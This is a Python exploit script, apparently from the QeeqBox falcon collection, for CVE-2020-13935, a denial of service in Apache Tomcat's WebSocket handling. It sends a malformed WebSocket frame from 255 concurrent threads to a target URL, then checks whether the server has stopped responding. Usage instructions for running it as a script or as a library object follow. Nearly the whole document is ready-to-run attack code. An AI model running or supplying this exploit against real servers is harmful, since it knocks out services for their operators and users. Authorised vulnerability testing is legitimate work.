#!/usr/bin/env python3
# Apache Tomcat Denial of Service (CVE-2020-13935)
# Ref: redteam-pentesting

from argparse import ArgumentParser
from logging import warning, error
from threading import Thread
from websocket import create_connection
from websocket._exceptions import WebSocketTimeoutException
from binascii import unhexlify
from time import sleep

class QBExploit:
    def __init__(self, **kwargs):
        self.__dict__.update(kwargs)
        self.exploit = '81ffffffffffffffffffffffffff20'

    def run_exploit(self):
        if all(x in self.__dict__ for x in ["target","verify"]):
            if self.target == None:
                warning('[!] No target')
                return -1
            try:
                threads = []
                def send_exploit(counter):
                    try:
                        warning('[X] {} Sending exploit to {}'.format(counter,self.target))
                        ws = create_connection(self.target,timeout=10)
                        ws.sock.send(unhexlify(self.exploit))
                        sleep(10)
                    except:
                        pass
                for counter in range(0,255):
                    t = Thread(target=send_exploit,args=(counter,))
                    threads.append(t)
                    t.start()

                warning('[X] Waiting on Target')
                for x in threads:
                     x.join()

                if self.verify:
                    self.verify_exploit()
                return True

            except Exception as e:
                if hasattr(e, 'message'):
                    error('[!] Error: {}'.format(e.message))
                else:
                    error('[!] Error: {}'.format(e))
        else:
            error('[!] Error in exploit arguments')
        return False
        
    def verify_exploit(self):
        try:
            ws = create_connection(self.target,timeout=5)
            warning('[X] Target is not vulnerable')
        except WebSocketTimeoutException:
            warning('[X] Target is vulnerable')
        return False

if __name__ == '__main__':

    print('''QeeqBox falcon (CVE-2020-13935 [passed])

------ How to Use (As Script) ------

CVE-2020-13935.py --target 'websocket' --verify 'true'

target      [Required]
verify      [Not required, default is false]

Examples:
CVE-2020-13935.py --target ws://localhost:8080/examples/websocket/chat --verify 'true'

------ How to Use (As Object)  ------

from CVE-2020-13935 import QBExploit
qbxploit = QBExploit(target='ws://localhost:8080/examples/websocket/chat',verify='true')
qbxploit.run_exploit()
''')
    warning('[X] Starting')
    parser = ArgumentParser()
    parser.add_argument('--target', type=str)
    parser.add_argument('--verify',type=str,required=False, default=False)
    args = parser.parse_args()
    qbxploit = QBExploit(**vars(args))
    qbxploit.run_exploit()
    warning('[X] Done')
